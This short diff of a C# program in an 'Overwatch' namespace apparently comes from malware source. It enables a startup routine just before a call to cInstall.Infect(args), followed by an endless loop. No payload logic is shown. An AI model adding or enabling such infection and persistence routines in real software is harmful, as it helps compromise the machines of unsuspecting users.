@@ -14,7 +14,7 @@ namespace Overwatch
         {
             try
             {
-                //cStartupOptions.ProcessStartInfo();
+                cStartupOptions.ProcessStartInfo();
                 cInstall.Infect(args);
                 while (true)
                 {
